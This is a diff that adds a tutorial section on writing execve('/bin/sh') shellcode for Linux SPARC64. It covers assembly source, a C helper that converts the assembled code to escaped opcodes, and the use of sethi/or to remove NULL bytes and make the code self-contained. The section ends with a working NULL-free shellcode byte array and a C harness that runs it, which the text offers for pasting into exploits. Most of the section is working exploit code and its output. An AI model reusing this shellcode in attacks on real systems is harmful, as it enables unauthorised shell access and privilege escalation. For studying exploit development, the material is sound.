@@ -400,3 +400,247 @@ End of assembler dump.
 ```
 
 From this function we can deduct some stuff: firstly, that Linux uses 0x10 as the value to execute tcc's. Secondly, that the syscall execve number is 59 (/usr/include/asm-sparc64/unistd.h) and the third one and more important: we already got all the necessary to build our first assembler shellcode in sparc64.
+
+
+### 6.1. Basic Exec Shellcode
+
+As we saw in the previous section, we don't need many ingredients to code a mini shellcode in asm for sparc64. Let's do one and test it:
+
+```
+    % cat shellcode.S
+    .global _start
+
+    _start:
+
+      save    %sp, -96, %sp
+      set     string, %o0
+      mov     0xb, %g1
+      ta      0x90
+      mov     1, %g1
+      ta      0x90
+
+    string:
+    .ascii  "/bin/sh"
+```
+
+```
+    % as shellcode.S -o shellcode.o
+    % ld shellcode.o -o shellcode
+    % echo $$
+    5913
+    % ./shellcode
+    % echo $$
+    26257
+    % exit
+    % echo $$
+    5913
+```
+
+It worked. We have just executed a shell. However, as it is already explained in a lot of papers, to execute a code, whatever it is, *from inside* another program, we will need to inject the necessary opcodes and not the assembler code. The reason for that is obvious: the process is already being executed and what CPU is waiting for are things she can understand, and that are opcodes. We could generate them via old school method, that is, by hand, but it is quite tedious to copy paste every single ``x/bx`` from GDB, so normally I tend to use this small program:
+
+```
+    int main (int argc, char *argv[])
+    {
+      unsigned char ch;
+      int a = 1;
+      printf ("char sc[] = \n\"");
+      while (1) {
+        if (read (0, &ch, 1) != 1) break;
+        printf ("\\x%02x", ch);
+        if (!(a++ % 10)) printf ("\"\n\"");
+      }
+      printf ("\";\n");
+    }
+```
+
+This code only needs a valid argument from which generate opcodes. How do we pass a valid argument? Generating a binary object. And how do we generate it? Let's see how:
+
+```
+    % gcc opcode_generator.c -o opcode_generator   # opcode_generator.c contains the above code
+    % as scode.s -o scode.o  # the shellcode
+    % file scode.o
+    scode.o: ELF 32-bit MSB relocatable, SPARC, version 1 (SYSV), not stripped
+    % objcopy -O binary -j .text scode.o scode.bin
+    % ./opcode_generator < scode.bin
+    char sc[] =
+    "\x9d\xe3\xbf\xa0\x11\x00\x00\x00\x90\x12"
+    "\x20\x00\x82\x10\x20\x0b\x91\xd0\x20\x90"
+    "\x82\x10\x20\x01\x91\xd0\x20\x90\x2f\x62"
+    "\x69\x6e\x2f\x73\x68";
+```
+
+Et voilà, we got the opcodes ready to be copied and pasted in your favourite exploit. So if we have it, let's execute it in a .c file to test it, right?
+
+```
+    char sc[] =
+    "\x9d\xe3\xbf\xa0\x11\x00\x00\x00\x90\x12"
+    "\x20\x00\x82\x10\x20\x0b\x91\xd0\x20\x90"
+    "\x82\x10\x20\x01\x91\xd0\x20\x90\x2f\x62"
+    "\x69\x6e\x2f\x73\x68";
+
+    int main() {
+      int (*scode)();
+      scode = (int (*)()) sc;
+      (int)(*scode)();
+      return (0);
+    }
+```
+
+We compile and execute:
+
+```
+    % echo $$
+    9529
+    % ./a
+    % echo $$
+    9529
+```
+
+Something happened and the shellcode has not been executed. Well, to be precise, more than one thing happened, but the most important and remarkable ones are two: the shellcode is not 'self-contained' and it has NULLs in it. Let's forget about the NULLs for a moment and focus on the self-contained concept, which is the real reason behing the machine code not being executed.
+
+If the reader is familiarized with the ELF file specification, she will have already been able to check that every ELF executable has many sections (.data, .text, .bss, etc), and in every of these sections there are stored specific parts of our program. For instance, the map containing shared library addresses is stored in the .got section, and is for this reason that there are specific papers talking about how to modify such a section and point the program to where we want. Other example could be the famous paper in which they take advantage of how the old compiled GCC to overwrite .dtors. Keeping this in mind, we need to engineer a system to get in the same section than the rest of the code the string to the shell we are willing to execute.
+
+In IA-32 this is typically done with the classic ``jmp + call/pop`` to place in the stack the address of the string and make it possible to jump into it, but in SPARC this cannot be done directly due to the already explained Delay Slot: if we execute a call, the CPU will already process as well the next instruction. This is what we explained before. In some papers, the authors use the ``bn`` instruction -branch never-, which forces the CPU to not jump to the address used as argument to then store somewhere the value of %o7 and the needed offset, but even being this case the most optimized one in terms of resource usage, I believe it is not as good when it comes to make a compact shellcode, which is always one of the main goals when writing shellcodes. For this reason, what we can do is to *emulate* the behavior of the output generated by GNU as: replace 'set' by its equivalent self-contained and not to define symbols. So let's go back to the above example code to search for the defined symbols and see how we can fix the problem of the string in memory:
+
+```
+ % as shellcode.S -als -o shellcode.o
+SPARC GAS  shellcode.S                  page 1
+
+   1                    .global _start
+   2
+   3                    _start:
+   4
+   5 0000 9DE3BFA0        save    %sp, -96, %sp
+   6 0004 11000000        set     string, %o0
+   6      90122000
+   7 000c 8210200B        mov     0xb, %g1
+   8 0010 91D02090        ta      0x90
+   9 0014 82102001        mov     1, %g1
+  10 0018 91D02090        ta      0x90
+  11
+  12                    string:
+  13 001c 2F62696E      .ascii  "/bin/sh"
+  13      2F7368
+SPARC GAS  shellcode.S                  page 2
+
+
+DEFINED SYMBOLS
+         shellcode.S:3      .text:0000000000000000 _start
+         shellcode.S:12     .text:000000000000001c string
+
+NO UNDEFINED SYMBOLS
+%
+```
+
+The ``set string`` that we see in the 6th line of the code, which symbol we get referenced at the end of the output, is the equivalent of /bin/sh, represented in hexadecimal as 0x2f62696e2f7368. Here we get out first obstacle, because given the fact the SPARC is an architecture in which all the instructions are aligned to 4 bytes as we mentioned at the beginning when talking about RISC, we need to segment the load of the string in memory in two steps: 4 bytes for the string '/bin' and 4 more for '/sh\0', because, as a reminder, we need this NULL to be able to execute the shell. The solution for this is to 'load' in the local registers the address of the shell via the instruction ``sethi``, which comes from executing ``set`` on the most significant bits -remember, big-endian here- of the register. This instruction needs two arguments: a constant of 22 bits in size and a destination register. The result of executing ``sethi`` will be that it will set the 22 MSB bits to the constant we pass to and it will also make a clear of the other 10 bits. This is done like this because of the nature of the instruction, because when encoding it needs two bits for 00, 5 bits for the destination register, 3 for the value 100 and 22 for the constant. 2 + 5 + 3 + 22 = 32. Let's see how to write '/bin/sh' on the screen using ``sethi``:
+
+```
+    % cat binsh.s
+    .align 4
+    .global _start
+
+    _start:
+
+    mov 1, %o0
+    sethi   %hi(0x2F62696E), %l0
+    sethi   %hi(0x2F736800), %l1
+    and     %sp, %sp, %o1
+    mov 8, %o2
+    mov 4, %g1
+    ta 0x10
+    mov 0, %o0
+    mov 1, %g1
+    ta 0x10
+```
+
+```
+    % as binsh.s -o binsh.o && ld binsh.o -o binsh
+    % strace ./binsh
+    execve("./binsh", ["./binsh"], [/* 36 vars */]) = 0
+    write(1, "/bh\0/sh\0", 8/bh/sh)               = 8
+    exit(0)                                 = ?
+    Process 15606 detached
+    %
+```
+
+Let's examine this to explain a couple of things: the first one is, why is that we have used local registers to this stack frame if the arguments to syscalls are passed in the output registers? We have done that because is one of the ways we have to store the memory address of the string in %o1 by the logic AND over the %sp. Hip hop hurray for SPARC, which accepts operations with three registers. The second thing to explain is that, what we really store in %o1 is the *address **of the address*** of the string, which means, we are pointing %o1 to %l0, which is where the string begins. In any case, something curious happened: some NULLs arise stored by the sethi instruction in the 10 LSB of the registers but also we got an 'h' in the place of the 'i' because the clear performed by sethi has reached some of its bits.
+
+To fix the clear done by sethi we can use the logic instruction 'or' as we would do in any other platform or language. If we perform an 'or' on a zero with another value, this other value will prevail. If both values are equal, it will remain unchanged and this is exactly what we are looking for. Let's try it adding the needed OR's:
+
+```
+    % grep -B1 or binsh2.s
+    sethi   %hi(0x2F62696E), %l0
+    or      %l0, %lo(0x2F62696E), %l0
+    sethi   %hi(0x2F736800), %l1
+    or      %l1, %lo(0x2F736800), %l1
+    % as binsh2.s -o binsh2.o && ld binsh2.o -o binsh2
+    % strace ./binsh2
+    execve("./binsh2", ["./binsh2"], [/* 36 vars */]) = 0
+    write(1, "/bin/sh\0", 8/bin/sh)                = 8
+    exit(0)                                 = ?
+    Process 32182 detached
+    %
+```
+
+It worked like a charm. We have reached our goal. Let's remove that write and replace it by an ``execve()``:
+
+```
+    .global _start
+
+    _start:
+
+    sethi   %hi(0x2F62696E), %l0
+    or      %l0, %lo(0x2F62696E), %l0
+    sethi   %hi(0x2F736800), %l1
+    or      %l1, %lo(0x2F736800), %l1
+    and     %sp, %sp, %o0
+    mov     0xb, %g1
+    ta      0x10
+    mov     1, %g1
+    xor     %o1, %o1, %o0
+    ta      0x10
+```
+
+This working code generated the below hex representation:
+
+```
+  char sc[] =
+  "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
+  "\xdc\xda\xa2\x14\x60\x00\x90\x0b\x80\x0e"
+  "\x82\x10\x20\x0b\x91\xd0\x20\x10\x82\x10"
+  "\x20\x01\x90\x1a\x40\x09\x91\xd0\x20\x10";
+```
+
+All good but for one thing... there is a NULL. Which instruction is generating this NULL? We can check it with GNU as or we can sense it already. Let's think: if before adding the OR's we did add by hand a NULL to the end of the /bin/sh\0 string... is this the NULL that we are getting now? Yes, it is:
+
+```
+    7 0008 230BDCDA         sethi %hi(0x2F736800), %l1
+    8 000c A2146000         or %l1, %lo(0x2F736800), %l1
+```
+
+Here we have it. At this point, we ask ourselves how to remove it. We could perform an XOR over the low bits of %l1, but the reality is that we don't need that because ``sethi`` *already* does this work for us when it sets to 0 the last 10 bits of the register. So if we remove the second 'or' we still have a working shellcode and we have eliminated an instruction, saving 4 bytes:
+
+```
+    % cat sc.c
+    char sc[] =
+    "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
+    "\xdc\xda\x90\x0b\x80\x0e\x82\x10\x20\x0b"
+    "\x91\xd0\x20\x10\x82\x10\x20\x01\x90\x1a"
+    "\x40\x09\x91\xd0\x20\x10";
+
+    int main() {
+      int (*scode)();
+      scode = (int (*)()) sc;
+      (*scode)();
+    }
+    % gcc sc.c -o sc
+    % echo $$
+    9529
+    % ./sc
+    % echo $$
+    11256
+    % exit
+    %
+```
+
+We finally succeeded: we have a valid shellcode working for Linux SPARC (and that *would* work on Solaris if we replace the trap code by 0x8) and without NULLs. But as normally is emphasized in lots of similar documents, a shellcode as the above will only work in situations where the escalation of privileges is executed locally, via physical access to the server or using a pre-existing network connection (like SSH).
